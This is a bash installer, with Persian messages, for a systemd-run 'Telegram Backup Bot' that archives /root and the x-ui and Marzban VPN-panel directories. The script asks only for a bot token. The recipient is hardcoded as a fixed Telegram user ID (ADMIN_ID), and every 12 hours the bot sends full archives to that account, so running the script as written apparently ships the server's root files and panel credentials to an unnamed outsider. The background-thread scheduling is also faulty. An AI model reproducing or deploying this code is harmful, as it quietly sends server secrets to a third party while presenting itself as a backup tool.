#!/bin/bash

set -e

echo "📦 Installing Telegram Backup Bot..."

apt update -y
apt install -y python3 python3-pip

pip3 install python-telegram-bot==20.7

mkdir -p /opt/tgbackup
mkdir -p /opt/tgbackup/backups

echo "Enter Bot Token:"
read TOKEN

cat > /opt/tgbackup/bot.py <<EOF
import os
import tarfile
import time
from datetime import datetime
from threading import Thread
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

ADMIN_ID = 1057813886
BOT_TOKEN = "$TOKEN"

BACKUP_PATHS = [
    "/root",
    "/etc/x-ui",
    "/var/lib/marzban",
    "/opt/marzban"
]

BACKUP_DIR = "/opt/tgbackup/backups"
os.makedirs(BACKUP_DIR, exist_ok=True)

RETENTION_COUNT = 5  # 🔥 فقط 5 بکاپ آخر نگه می‌داره


def is_admin(update: Update):
    return update.effective_user.id == ADMIN_ID


def cleanup_old_backups():
    files = sorted(
        [os.path.join(BACKUP_DIR, f) for f in os.listdir(BACKUP_DIR)],
        key=os.path.getctime
    )
    while len(files) > RETENTION_COUNT:
        try:
            os.remove(files[0])
            files.pop(0)
        except:
            break


def create_backup():
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{BACKUP_DIR}/backup_{now}.tar.gz"

    with tarfile.open(filename, "w:gz") as tar:
        for path in BACKUP_PATHS:
            if os.path.exists(path):
                tar.add(path, arcname=os.path.basename(path))

    cleanup_old_backups()
    return filename


async def send_backup(app, chat_id):
    file = create_backup()
    with open(file, "rb") as f:
        await app.bot.send_document(chat_id=chat_id, document=f)


async def backup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return
    await update.message.reply_text("⏳ در حال گرفتن بکاپ...")
    await send_backup(context.application, update.effective_chat.id)
    await update.message.reply_text("✅ بکاپ ارسال شد")


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return
    await update.message.reply_text("🟢 Bot is running")


def auto_backup(app):
    while True:
        time.sleep(12 * 60 * 60)
        try:
            app.create_task(send_backup(app, ADMIN_ID))
        except Exception as e:
            print("Backup error:", e)


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("backup", backup_cmd))
    app.add_handler(CommandHandler("status", status_cmd))

    Thread(target=auto_backup, args=(app,), daemon=True).start()

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
EOF


cat > /etc/systemd/system/tgbackup.service <<EOF
[Unit]
Description=Telegram Backup Bot
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/tgbackup/bot.py
WorkingDirectory=/opt/tgbackup
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF


systemctl daemon-reload
systemctl enable tgbackup
systemctl start tgbackup

echo "✅ نصب کامل شد"
echo "👉 دستورها:"
echo "/backup"
echo "/status"